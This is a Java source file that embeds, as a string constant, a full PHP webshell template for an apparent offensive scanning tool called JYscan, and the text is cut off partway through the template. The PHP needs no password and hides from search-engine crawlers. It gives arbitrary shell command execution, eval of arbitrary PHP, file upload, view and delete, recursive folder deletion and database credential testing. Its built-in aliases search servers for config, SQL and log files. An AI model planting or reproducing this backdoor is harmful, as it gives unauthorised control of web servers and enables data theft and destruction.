package space.jyscan.modules.webshell;

/**
 * PHP模板常量，移植自 freeclient/internal/webshell/php.go 中的反引号原始字符串。
 *
 * <p>字节一致性：go 源文件为 CRLF，Go 规范规定原始字符串中的回车符（CR）会被丢弃，
 * 因此这里保存的是去掉 CR 后的 LF 文本，与 Go 运行时字符串逐字节一致。
 * 转义策略（全部由脚本从 go 源机械生成，见生成记录）：
 * <ul>
 *   <li>反斜杠翻倍（文本块中反斜杠仍是转义符）；</li>
 *   <li>行尾空白与纯空白行的空白转义为 与（javac 会剥离行尾空白）；</li>
 *   <li>三连及以上双引号转义（本模板无，防御性处理）；</li>
 *   <li>闭合定界符紧接内容末尾（列 0），保证无附带缩进剥离、无尾部换行。</li>
 * </ul>
 */
final class PhpTemplates {

    private PhpTemplates() {
    }

    /** 无密码大马模板，对应 go 中 generateNoPasswordLargePHPWebShell 的 noPasswordShell。 */
    static final String NO_PASSWORD_LARGE = """
<?php
/**
 * JYscan专属PHP大马 - 无密码版本
 * 基于WSO 2.6风格，专为JYscan项目定制
 * 版本: 1.0 - 无需密码直接使用
 */

session_start();

// JYscan专属配置
$JYSCAN_COLOR = "#00a8ff";      // JYscan主题色
$JYSCAN_VERSION = "1.0";
$JYSCAN_TITLE = "JYscan Webshell";

// 安全性和隐蔽性设置
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@error_reporting(0);

// 搜索引擎检测和伪装
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler");
    if(preg_match('/'.implode('|',$userAgents) .'/i',$_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

// 定义JYscan版本
@define('JYSCAN_VERSION', $JYSCAN_VERSION);

// 系统检测
if(strtolower(substr(PHP_OS,0,3)) == "win") {
    $os = 'win';
} else {
    $os = 'nix';
}

$safe_mode = @ini_get('safe_mode');
if(!$safe_mode) {
    error_reporting(0);
}

$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();

if(isset($_POST['c'])) {
    @chdir($_POST['c']);
}

$cwd = @getcwd();
if($os == 'win') {
    $home_cwd = str_replace("\\\\","/",$home_cwd);
    $cwd = str_replace("\\\\","/",$cwd);
}

if($cwd[strlen($cwd)-1] != '/') {
    $cwd .= '/';
}

/**
 * 递归删除文件夹 - JYscan版本
 */
function jyscanDeleteFolder($folder) {
    if(!@is_dir($folder)) {
        return false;
    }
\s\s\s\s
    $files = @scandir($folder);
    if($files === false) {
        return false;
    }
\s\s\s\s
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
\s\s\s\s\s\s\s\s
        $fullPath = $folder . DIRECTORY_SEPARATOR . $file;
\s\s\s\s\s\s\s\s
        if(@is_dir($fullPath)) {
            // 递归删除子文件夹
            if(!jyscanDeleteFolder($fullPath)) {
                return false;
            }
        } else {
            // 删除文件
            if(!@unlink($fullPath)) {
                return false;
            }
        }
    }
\s\s\s\s
    // 删除空文件夹
    return @rmdir($folder);
}

// JYscan专属功能菜单
$JYSCAN_MENU = array(
    '文件管理' => 'FilesMan',
    '命令执行' => 'Console',\s
    '数据库管理' => 'Sql',
    'PHP工具' => 'phptools',
    '安全信息' => 'SecInfo',
    '网络扫描' => 'Network',
    '端口扫描' => 'PortScan',
    '目录扫描' => 'DirScan',
    '信息收集' => 'InfoGather'
);

// 命令别名 - JYscan优化版
if($os == 'win') {
    $JYSCAN_ALIASES = array(
        "目录列表"=>"dir",
        "查找配置文件"=>"dir /s /w /b *config*.php",
        "显示网络连接"=>"netstat -an",
        "显示服务"=>"net start",
        "用户账户"=>"net user",
        "IP配置"=>"ipconfig /all",
        "系统信息"=>"systeminfo",
        "进程列表"=>"tasklist",
        "网络共享"=>"net share"
    );
} else {
    $JYSCAN_ALIASES = array(
        "目录列表"=>"ls -lha",
        "端口监听"=>"netstat -an | grep -i listen",
        "进程状态"=>"ps aux",
        "系统信息"=>"uname -a",
        "磁盘使用"=>"df -h",
        "内存使用"=>"free -m",
        "查找配置文件"=>"find / -name '*config*.php' 2>/dev/null",
        "查找数据库文件"=>"find / -name '*.sql' 2>/dev/null",
        "查找日志文件"=>"find / -name '*.log' 2>/dev/null"
    );
}

/**
 * JYscan专属头部
 */
function jyscanHeader() {
    global $JYSCAN_COLOR, $JYSCAN_VERSION, $JYSCAN_TITLE, $cwd, $os, $JYSCAN_MENU;
\s\s\s\s
    if(empty($_POST['charset'])) {
        $_POST['charset'] = 'UTF-8';
    }
\s\s\s\s
    echo "<html><head>
    <meta http-equiv='Content-Type' content='text/html; charset=".$_POST['charset'] ."'>
    <title>".$_SERVER['HTTP_HOST'] ." - ".$JYSCAN_TITLE." ".$JYSCAN_VERSION ."</title>
    <style>
        body{background-color:#1a1a1a;color:#e0e0e0;font-family:'Courier New',monospace;margin:0;}
        body,td,th{ font: 10pt 'Courier New',monospace;margin:0;vertical-align:top;color:#e0e0e0; }
        table.info{ color:#fff;background-color:#2a2a2a; }
        span,h1,a{ color: ".$JYSCAN_COLOR." !important; }
        span{ font-weight: bolder; }
        h1{ border-left:5px solid ".$JYSCAN_COLOR.";padding: 10px;font: 16pt 'Courier New';background-color:#222;margin:0px; }
        div.content{ padding: 10px;margin:10px;background-color:#2a2a2a;border:1px solid #444; }
        a{ text-decoration:none; }
        a:hover{ text-decoration:underline;background-color:#333; }
        .ml1{ border:1px solid #444;padding:10px;margin:10px;overflow: auto;background-color:#1a1a1a; }
        .bigarea{ width:100%%;height:300px; }
        input,textarea,select{ margin:5px;color:#fff;background-color:#333;border:1px solid ".$JYSCAN_COLOR."; font: 10pt 'Courier New',monospace; padding:5px; }
        form{ margin:0px; }
        #toolsTbl{ text-align:center; }
        .toolsInp{ width: 400px }
        .main th{text-align:left;background-color:#3a3a3a;padding:8px;}
        .main tr:hover{background-color:#3a3a3a}
        .l1{background-color:#2a2a2a}
        .l2{background-color:#222}
        pre{font-family:'Courier New',monospace;}
        .jyscan-menu{background-color:#222;padding:10px;border-bottom:3px solid ".$JYSCAN_COLOR.";}
        .jyscan-menu a{margin:0 15px;padding:8px 15px;border:1px solid #444;}
        .jyscan-menu a:hover{background-color:".$JYSCAN_COLOR.";color:#000;}
    </style>
    <script>
        var c_ = '".htmlspecialchars($cwd) ."';
        var a_ = '".htmlspecialchars(@$_POST['a']) ."'
\s\s\s\s\s\s\s\s
        function g(a,c,p1,p2,p3,charset) {
            var form = document.createElement('form');
            form.method = 'post';
            form.style.display = 'none';
\s\s\s\s\s\s\s\s\s\s\s\s
            if(a != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'a';
                input.value = a;
                form.appendChild(input);
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            if(c != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'c';
                input.value = c;
                form.appendChild(input);
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            if(p1 != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'p1';
                input.value = p1;
                form.appendChild(input);
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            if(p2 != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'p2';
                input.value = p2;
                form.appendChild(input);
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            if(p3 != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'p3';
                input.value = p3;
                form.appendChild(input);
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            if(charset != null) {
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'charset';
                input.value = charset;
                form.appendChild(input);
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            document.body.appendChild(form);
            form.submit();
        }
\s\s\s\s\s\s\s\s
        function executeJYscan(cmd) {
            if(cmd.trim() == '') return;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            xhr.onreadystatechange = function() {
                if(xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById('output').innerHTML = xhr.responseText;
                }
            };
            xhr.send('a=Console&p1=' + encodeURIComponent(cmd));
        }
    </script>
    </head><body>
\s\s\s\s
    <div class='jyscan-menu'>
        <h1>🚀 ".$JYSCAN_TITLE." ".$JYSCAN_VERSION."</h1>
        <div style='margin:10px 0;'>";
\s\s\s\s
    // 显示菜单
    foreach($JYSCAN_MENU as $name => $action) {
        echo "<a href='javascript:void(0)' onclick=\\"g('" . $action . "')\\">" . $name . "</a> ";
    }
\s\s\s\s
    echo "</div></div>";
\s\s\s\s
    // 系统信息栏
    $freeSpace = @disk_free_space($cwd);
    $totalSpace = @disk_total_space($cwd);
    $totalSpace = $totalSpace ? $totalSpace : 1;
\s\s\s\s
    echo "<table class=info cellpadding=5 cellspacing=0 width=100%><tr>
        <td><span>系统:</span> ".php_uname()."</td>
        <td><span>PHP版本:</span> ".phpversion()."</td>
        <td><span>当前目录:</span> ".htmlspecialchars($cwd)."</td>
        <td><span>磁盘空间:</span> ".jyscanViewSize($freeSpace)." / ".jyscanViewSize($totalSpace)."</td>
        <td><span>客户端IP:</span> ".$_SERVER['REMOTE_ADDR']."</td>
    </tr></table>";
}

/**
 * JYscan专属底部
 */
function jyscanFooter() {
    echo "</body></html>";
}

/**
 * 格式化文件大小 - JYscan版本
 */
function jyscanViewSize($s) {
    if($s >= 1073741824) {
        return sprintf('%1.2f', $s / 1073741824) . ' GB';
    } elseif($s >= 1048576) {
        return sprintf('%1.2f', $s / 1048576) . ' MB';
    } elseif($s >= 1024) {
        return sprintf('%1.2f', $s / 1024) . ' KB';
    } else {
        return $s . ' B';
    }
}

/**
 * 执行命令 - JYscan优化版
 */
function jyscanEx($in) {
    $out = '';
    if(function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\\n", $out);
    } elseif(function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
    } elseif(function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
    } elseif(function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif(is_resource($f = @popen($in, "r"))) {
        $out = "";
        while(!@feof($f)) {
            $out .= fread($f, 1024);
        }
        pclose($f);
    } else {
        $out = "命令执行功能被禁用";
    }
    return $out;
}

/**
 * 文件管理器 - JYscan版本
 */
function actionFilesMan() {
    global $cwd, $os;
\s\s\s\s
    jyscanHeader();
    echo "<h1>📁 文件管理器</h1><div class=content>";
\s\s\s\s
    // 文件上传处理
    if(isset($_FILES['f'])) {
        $uploadFile = $_FILES['f'];
        if($uploadFile['error'] == 0) {
            // 显示上传文件信息
            echo "<div style='color:#ffff00'>上传文件信息: " . htmlspecialchars($uploadFile['name']) . " (大小: " . $uploadFile['size'] . " 字节)</div>";
            echo "<div style='color:#ffff00'>临时文件: " . htmlspecialchars($uploadFile['tmp_name']) . "</div>";
\s\s\s\s\s\s\s\s\s\s\s\s
            // 检查临时文件是否存在且可读
            if(!file_exists($uploadFile['tmp_name'])) {
                echo "<div style='color:#ff0000'>临时文件不存在</div>";
            } elseif(!is_readable($uploadFile['tmp_name'])) {
                echo "<div style='color:#ff0000'>临时文件不可读</div>";
            } else {
                // 检查目录权限并尝试修复
                if(!is_writable($cwd)) {
                    // 尝试更改目录权限
                    if(@chmod($cwd, 0777)) {
                        echo "<div style='color:#ffff00'>目录权限已修复为0777</div>";
                    }
                }
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                $targetPath = $cwd . DIRECTORY_SEPARATOR . $uploadFile['name'];
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                // 检查目标文件是否已存在
                if(file_exists($targetPath)) {
                    // 尝试删除已存在的文件
                    if(@unlink($targetPath)) {
                        echo "<div style='color:#ffff00'>已删除同名文件: " . htmlspecialchars($uploadFile['name']) . "</div>";
                    } else {
                        echo "<div style='color:#ff0000'>无法删除同名文件</div>";
                    }
                }
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                // 尝试多种上传方法
                $uploadSuccess = false;
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                // 方法1: 标准move_uploaded_file
                if(@move_uploaded_file($uploadFile['tmp_name'], $targetPath)) {
                    echo "<div style='color:#00ff00'>文件上传成功（标准方法）: " . htmlspecialchars($uploadFile['name']) . "</div>";
                    @chmod($targetPath, 0644);
                    $uploadSuccess = true;
                }\s
                // 方法2: 复制方法
                elseif(@copy($uploadFile['tmp_name'], $targetPath)) {
                    echo "<div style='color:#00ff00'>文件上传成功（复制方法）: " . htmlspecialchars($uploadFile['name']) . "</div>";
                    @chmod($targetPath, 0644);
                    $uploadSuccess = true;
                }
                // 方法3: 文件内容写入
                else {
                    $content = @file_get_contents($uploadFile['tmp_name']);
                    if($content !== false && @file_put_contents($targetPath, $content) !== false) {
                        echo "<div style='color:#00ff00'>文件上传成功（内容写入方法）: " . htmlspecialchars($uploadFile['name']) . "</div>";
                        @chmod($targetPath, 0644);
                        $uploadSuccess = true;
                    }
                }
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                if(!$uploadSuccess) {
                    // 输出详细的错误信息
                    $errorMsg = "文件上传失败 - ";
                    if(!is_writable($cwd)) {
                        $errorMsg .= "目录不可写 (权限: " . substr(sprintf('%o', fileperms($cwd)), -4) . ")";
                    } elseif(!is_uploaded_file($uploadFile['tmp_name'])) {
                        $errorMsg .= "文件上传验证失败";
                    } else {
                        $errorMsg .= "所有上传方法都失败";
                    }
                    echo "<div style='color:#ff0000'>" . $errorMsg . "</div>";
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                    // 显示详细的系统信息
                    echo "<div style='color:#ffff00'>当前目录: " . htmlspecialchars($cwd) . "</div>";
                    echo "<div style='color:#ffff00'>目录权限: " . substr(sprintf('%o', fileperms($cwd)), -4) . "</div>";
                    echo "<div style='color:#ffff00'>Web服务器用户: " . @get_current_user() . "</div>";
                    echo "<div style='color:#ffff00'>PHP进程用户: " . (function_exists('posix_getuid') ? posix_getuid() : '未知') . "</div>";
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                    // 尝试创建测试文件
                    $testFile = $cwd . DIRECTORY_SEPARATOR . 'test_write.txt';
                    if(@file_put_contents($testFile, 'test') !== false) {
                        echo "<div style='color:#00ff00'>测试文件创建成功，目录可写</div>";
                        @unlink($testFile);
                    } else {
                        echo "<div style='color:#ff0000'>测试文件创建失败，目录确实不可写</div>";
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                        // 提供解决方案
                        echo "<div style='color:#ffff00;margin:10px 0;padding:10px;border:1px solid #ffff00;background:#222;'>";
                        echo "<h3>💡 解决方案：</h3>";
                        echo "<p>由于PHP进程用户没有写入权限，请尝试以下方法：</p>";
                        echo "<ol>";
                        echo "<li><strong>方法1：更改目录权限</strong><br>";
                        echo "在服务器上执行命令：<code>sudo chmod 777 /var/www/html/</code></li>";
                        echo "<li><strong>方法2：更改目录所有者</strong><br>";
                        echo "在服务器上执行命令：<code>sudo chown www-data:www-data /var/www/html/</code></li>";
                        echo "<li><strong>方法3：使用可写子目录</strong><br>";
                        echo "尝试上传到可写的子目录，如：<code>/var/www/html/uploads/</code></li>";
                        echo "<li><strong>方法4：使用临时目录</strong><br>";
                        echo "尝试上传到临时目录：<code>/tmp/</code></li>";
                        echo "</ol>";
                        echo "</div>";
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                        // 尝试自动寻找可写目录
                        echo "<div style='color:#ffff00;margin:10px 0;'>正在扫描可写目录...</div>";
                        $writableDirs = array();
                        $potentialDirs = array(
                            '/tmp/',
                            '/var/tmp/',
                            '/home/yiqiu/',
                            '/var/www/html/uploads/',
                            '/var/www/html/tmp/',
                            '/var/www/tmp/',
                            @$_SERVER['DOCUMENT_ROOT'] . '/uploads/',
                            dirname(@$_SERVER['SCRIPT_FILENAME']) . '/uploads/'
                        );
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                        foreach($potentialDirs as $dir) {
                            if(@is_dir($dir) && @is_writable($dir)) {
                                $writableDirs[] = $dir;
                                echo "<div style='color:#00ff00'>发现可写目录: " . htmlspecialchars($dir) . "</div>";
                            }
                        }
\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s\s
                        if(!empty($writableDirs)) {
                            echo "<div style='color:#00ff00;margin:10px 0;padding:10px;border:1px solid #00ff00;background:#222;'>";
                            echo "<h3>✅ 发现可写目录！</h3>";
                            echo "<p>您可以将文件上传到以下可写目录：</p>";
                            echo "<ul>";
                            foreach($writableDirs as $dir) {
                                echo "<li><code>" . htmlspecialchars($dir) . "</code></li>";
                            }
                            echo "</ul>";
                            echo "</div>";
                        }
                    }
                }
            }
        } else {
            // 输出上传错误代码
            $uploadErrors = array(
                1 => "文件大小超过服务器限制",
                2 => "文件大小超过表单限制",\s
                3 => "文件只有部分被上传",
                4 => "没有文件被上传",
                6 => "找不到临时文件夹",
                7 => "文件写入失败",
                8 => "PHP扩展程序停止文件上传"
            );
            $errorCode = $uploadFile['error'];
            $errorMsg = isset($uploadErrors[$errorCode]) ? $uploadErrors[$errorCode] : "未知错误 (代码: $errorCode)";
            echo "<div style='color:#ff0000'>文件上传失败: " . $errorMsg . "</div>";
        }
    }
\s\s\s\s
    // 文件操作处理
    if(isset($_POST['p1'])) {
        switch($_POST['p1']) {
            case 'view':
                $file = $_POST['p2'];
                if(@is_readable($file)) {
                    echo "<h3>查看文件: " . htmlspecialchars($file) . "</h3>";
                    echo "<pre class='ml1'>" . htmlspecialchars(@file_get_contents($file)) . "</pre>";
                }
                break;
            case 'delete':
                $file = $_POST['p2'];
                if(@unlink($file)) {
                    echo "<div style='color:#00ff00'>文件删除成功</div>";
                } else {
                    echo "<div style='color:#ff0000'>文件删除失败, 请检查文件权限!</div>";
                }
                break;
            case 'create_file':
                $filename = $_POST['p2'];
                $content = $_POST['p3'];
                $fullPath = $cwd . $filename;
                if(@file_put_contents($fullPath, $content) !== false) {
                    echo "<div style='color:#00ff00'>文件创建成功: " . htmlspecialchars($filename) . "</div>";
                    @chmod($fullPath, 0644);
                } else {
                    echo "<div style='color:#ff0000'>文件创建失败: " . htmlspecialchars($filename) . "</div>";
                }
                break;
            case 'create_folder':
                $foldername = $_POST['p2'];
                $fullPath = $cwd . $foldername;
                if(@mkdir($fullPath, 0755, true)) {
                    echo "<div style='color:#00ff00'>文件夹创建成功: " . htmlspecialchars($foldername) . "</div>";
                } else {
                    echo "<div style='color:#ff0000'>文件夹创建失败: " . htmlspecialchars($foldername) . "</div>";
                }
                break;
            case 'delete_folder':
                $folder = $_POST['p2'];
                if(@is_dir($folder)) {
                    // 递归删除文件夹
                    if(jyscanDeleteFolder($folder)) {
                        echo "<div style='color:#00ff00'>文件夹删除成功</div>";
                    } else {
                        echo "<div style='color:#ff0000'>文件夹删除失败, 请检查文件夹权限!</div>";
                    }
                } else {
                    echo "<div style='color:#ff0000'>目标不是文件夹或不存在</div>";
                }
                break;
        }
    }
\s\s\s\s
    // 目录导航表单
    echo "<form method='post' style='margin:10px 0;padding:10px;border:1px solid #444;background:#222;'>
        <input type='hidden' name='a' value='FilesMan'>
        <span style='font-weight:bold;color:#ffff00;'>📁 目录导航:</span><br>
        <input type='text' name='c' value='" . htmlspecialchars($cwd) . "' style='width:70%%;margin:5px 0;padding:5px;background:#333;color:#fff;border:1px solid #555;' placeholder='输入完整目录路径'>
        <input type='submit' value='进入目录' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'>
    </form>";
\s\s\s\s
    // 创建文件和文件夹表单（水平布局）
    echo "<div style='margin:10px 0;padding:10px;border:1px solid #444;background:#222;'>
        <span style='font-weight:bold;color:#ffff00;'>📄 创建文件/文件夹:</span><br>
\s\s\s\s\s\s\s\s
        <div style='display:flex;gap:20px;margin-top:10px;'>
            <!-- 创建文件表单 -->
            <div style='flex:1;'>
                <form method='post'>
                    <input type='hidden' name='a' value='FilesMan'>
                    <input type='hidden' name='c' value='" . htmlspecialchars($cwd) . "'>
                    <input type='hidden' name='p1' value='create_file'>
                    <table style='width:100%%;'>
                        <tr>
                            <td style='width:80px;'>文件名:</td>
                            <td><input type='text' name='p2' placeholder='例如: test.txt' style='width:100%%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
                        </tr>
                        <tr>
                            <td>内容:</td>
                            <td><textarea name='p3' placeholder='文件内容（可选）' style='width:100%%;height:40px;padding:5px;background:#333;color:#fff;border:1px solid #555;'></textarea></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td><input type='submit' value='创建文件' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'></td>
                        </tr>
                    </table>
                </form>
            </div>
\s\s\s\s\s\s\s\s\s\s\s\s
            <!-- 创建文件夹表单 -->
            <div style='flex:1;'>
                <form method='post'>
                    <input type='hidden' name='a' value='FilesMan'>
                    <input type='hidden' name='c' value='" . htmlspecialchars($cwd) . "'>
                    <input type='hidden' name='p1' value='create_folder'>
                    <table style='width:100%%;'>
                        <tr>
                            <td style='width:80px;'>文件夹名:</td>
                            <td><input type='text' name='p2' placeholder='例如: new_folder' style='width:100%%;padding:5px;background:#333;color:#fff;border:1px solid #555;'></td>
                        </tr>
                        <tr>
                            <td></td>
                            <td><input type='submit' value='创建文件夹' style='padding:5px 10px;background:#555;color:#fff;border:1px solid #666;'></td>
                        </tr>
                    </table>
                </form>
            </div>
        </div>
    </div>";
\s\s\s\s
    // 文件上传表单
    echo "<form method='post' enctype='multipart/form-data' style='margin:10px 0;' id='uploadForm'>
        <input type='hidden' name='a' value='FilesMan'>
        <span>上传文件:</span><br>
        <input type='file' name='f'>
        <div style='margin:10px 0;'>
            <label><input type='radio' name='uploadPath' value='current' checked> 当前目录 (" . htmlspecialchars($cwd) . ")</label><br>";
\s\s\s\s
    // 扫描可写目录选项
    $writableDirs = array();
    $potentialDirs = array(
        '/tmp/' => '系统临时目录',
        '/var/tmp/' => '系统临时目录',
        '/home/yiqiu/' => '用户主目录',
        '/var/www/html/uploads/' => '网站上传目录',
        '/var/www/html/tmp/' => '网站临时目录',
        '/var/www/tmp/' => '网站临时目录',
        @$_SERVER['DOCUMENT_ROOT'] . '/uploads/' => '文档根目录上传',
        dirname(@$_SERVER['SCRIPT_FILENAME']) . '/uploads/' => '脚本目录上传'
    );
\s\s\s\s
    foreach($potentialDirs as $dir => $desc) {
        if(@is_dir($dir) && @is_writable($dir)) {
            $writableDirs[$dir] = $desc;
            echo "<label><input type='radio' name='uploadPath' value='" . htmlspecialchars($dir) . "'> " . htmlspecialchars($desc) . " (" . htmlspecialchars($dir) . ")</label><br>";
        }
    }
\s\s\s\s
    echo "</div>
        <input type='submit' value='上传'>
    </form>
\s\s\s\s
    <script>
    document.getElementById('uploadForm').addEventListener('submit', function(e) {
        var selectedPath = document.querySelector('input[name=\\"uploadPath\\"]:checked').value;
        if(selectedPath !== 'current') {
            // 更新隐藏的目录字段
            var cInput = document.createElement('input');
            cInput.type = 'hidden';
            cInput.name = 'c';
            cInput.value = selectedPath;
            this.appendChild(cInput);
        }
    });
    </script>";
\s\s\s\s
    // 文件列表
    $files = @scandir($cwd);
    if($files) {
        echo "<table class='main' width='100%' cellpadding='5' cellspacing='0'>
            <tr><th>名称</th><th>大小</th><th>修改时间</th><th>权限</th><th>操作</th></tr>";
\s\s\s\s\s\s\s\s
        $i = 0;
        foreach($files as $file) {
            if($file == "." || $file == "..") continue;
\s\s\s\s\s\s\s\s\s\s\s\s
            $fullPath = $cwd . $file;
            $isDir = @is_dir($fullPath);
            $size = $isDir ? "DIR" : jyscanViewSize(@filesize($fullPath));
            $modTime = @date("Y-m-d H:i:s", @filemtime($fullPath));
            $perms = @fileperms($fullPath);
\s\s\s\s\s\s\s\s\s\s\s\s
            echo "<tr class='l" . ($i++ % 2 + 1) . "'>
                <td>" . ($isDir ? "📁" : "📄") . " " . htmlspecialchars($file) . "</td>
                <td>" . $size . "</td>
                <td>" . $modTime . "</td>
                <td>" . substr(sprintf('%o', $perms), -4) . "</td>
                <td>";
\s\s\s\s\s\s\s\s\s\s\s\s
            if(!$isDir) {
                echo "<a href='#' onclick=\\"g('FilesMan','" . $cwd . "','view','" . $file . "')\\">查看</a> ";
                echo "<a href='#' onclick=\\"g('FilesMan','" . $cwd . "','delete','" . $file . "')\\">删除</a>";
            } else {
                echo "<a href='#' onclick=\\"g('FilesMan','" . $fullPath . "/')\\">进入</a> ";
                echo "<a href='#' onclick=\\"if(confirm('确定要删除文件夹 \\\\\\"" . htmlspecialchars($file) . "\\\\\\" 吗？此操作不可恢复！')) g('FilesMan','" . $cwd . "','delete_folder','" . $file . "')\\" style='color:#ff4444;'>删除</a>";
            }
\s\s\s\s\s\s\s\s\s\s\s\s
            echo "</td></tr>";
        }
        echo "</table>";
    } else {
        echo "无法读取目录";
    }
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * 命令执行器 - JYscan版本
 */
function actionConsole() {
    global $JYSCAN_ALIASES;
\s\s\s\s
    // 检查是否是AJAX请求（通过executeJYscan函数调用）
    $isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
\s\s\s\s
    if(!$isAjax) {
        // 正常页面请求，显示完整界面
        jyscanHeader();
        echo "<div class=content>";
\s\s\s\s\s\s\s\s
        // 命令输入表单
        echo "<form onsubmit='executeJYscan(this.c.value);return false;' style='margin:10px 0;'>
            <span>输入命令:</span><br>
            <input type='text' name='c' class='toolsInp' placeholder='输入要执行的命令'>
            <input type='submit' value='执行'>
        </form>";
\s\s\s\s\s\s\s\s
        // 命令别名
        echo "<h3>常用命令:</h3><div style='margin:10px 0;'>";
        foreach($JYSCAN_ALIASES as $name => $cmd) {
            echo "<a href='javascript:void(0)' onclick=\\"executeJYscan('" . addslashes($cmd) . "')\\" style='display:inline-block;margin:2px;padding:5px;border:1px solid #444;'>" . $name . "</a> ";
        }
        echo "</div>";
\s\s\s\s\s\s\s\s
        echo "<div id='output'></div>";
        echo "</div>";
        jyscanFooter();
    } else {
        // AJAX请求，只返回命令执行结果
        if(isset($_POST['p1'])) {
            $cmd = $_POST['p1'];
            echo "<h3>执行命令: " . htmlspecialchars($cmd) . "</h3>";
            echo "<pre class='ml1' style='color:#00ff00'>" . htmlspecialchars(jyscanEx($cmd)) . "</pre>";
        }
    }
}

/**
 * 数据库管理 - JYscan版本
 */
function actionSql() {
    jyscanHeader();
    echo "<h1>🗄️ 数据库管理</h1><div class=content>";
\s\s\s\s
    // 数据库连接测试
    if(isset($_POST['p1'])) {
        $dbType = $_POST['p1'];
        $host = $_POST['p2'];
        $user = $_POST['p3'];
        $pass = $_POST['p4'];
        $db = $_POST['p5'];
\s\s\s\s\s\s\s\s
        echo "<h3>数据库连接测试:</h3>";
\s\s\s\s\s\s\s\s
        if($dbType == 'mysql') {
            if(function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($host, $user, $pass, $db);
                if($conn) {
                    echo "<div style='color:#00ff00'>MySQL连接成功!</div>";
                    @mysqli_close($conn);
                } else {
                    echo "<div style='color:#ff0000'>MySQL连接失败: " . @mysqli_connect_error() . "</div>";
                }
            } else {
                echo "<div style='color:#ff0000'>MySQL扩展未安装</div>";
            }
        } elseif($dbType == 'postgresql') {
            if(function_exists('pg_connect')) {
                $connStr = "host=$host user=$user password=$pass dbname=$db";
                $conn = @pg_connect($connStr);
                if($conn) {
                    echo "<div style='color:#00ff00'>PostgreSQL连接成功!</div>";
                    if(function_exists('pg_close')) @pg_close($conn);
                } else {
                    echo "<div style='color:#ff0000'>PostgreSQL连接失败</div>";
                }
            } else {
                echo "<div style='color:#ff0000'>PostgreSQL扩展未安装</div>";
            }
        }
    }
\s\s\s\s
    echo "<h3>数据库连接测试:</h3>";
    echo "<form method='post' style='margin:10px 0;'>
        <input type='hidden' name='a' value='Sql'>
        <table>
            <tr><td>数据库类型:</td><td>
                <select name='p1'>
                    <option value='mysql'>MySQL</option>
                    <option value='postgresql'>PostgreSQL</option>
                </select>
            </td></tr>
            <tr><td>主机:</td><td><input type='text' name='p2' value='localhost'></td></tr>
            <tr><td>用户名:</td><td><input type='text' name='p3' value='root'></td></tr>
            <tr><td>密码:</td><td><input type='password' name='p4'></td></tr>
            <tr><td>数据库名:</td><td><input type='text' name='p5'></td></tr>
            <tr><td colspan='2'><input type='submit' value='测试连接'></td></tr>
        </table>
    </form>";
\s\s\s\s
    echo "<h3>数据库信息:</h3>";
    echo "<pre class='ml1'>";
    if(function_exists('mysqli_connect')) {
        echo "MySQL扩展: 已安装\\n";
    } else {
        echo "MySQL扩展: 未安装\\n";
    }
    if(function_exists('pg_connect')) {
        echo "PostgreSQL扩展: 已安装\\n";
    } else {
        echo "PostgreSQL扩展: 未安装\\n";
    }
    echo "</pre>";
\s\s\s\s
    echo "</div>";
    jyscanFooter();
}

/**
 * PHP工具 - JYscan版本
 */
function actionPhptools() {
    jyscanHeader();
    echo "<h1>🔧 PHP工具</h1><div class=content>";
\s\s\s\s
    // PHP代码执行
    if(isset($_POST['p1'])) {
        $phpCode = $_POST['p1'];
        echo "<h3>PHP代码执行结果:</h3>";
        echo "<pre class='ml1' style='color:#00ff00'>";
        ob_start();
        eval($phpCode);
        $output = ob_get_clean();
        echo htmlspecialchars($output);
        echo "</pre>";
    }
\s\s\s\s
    echo "<h3>PHP代码执行:</h3>";
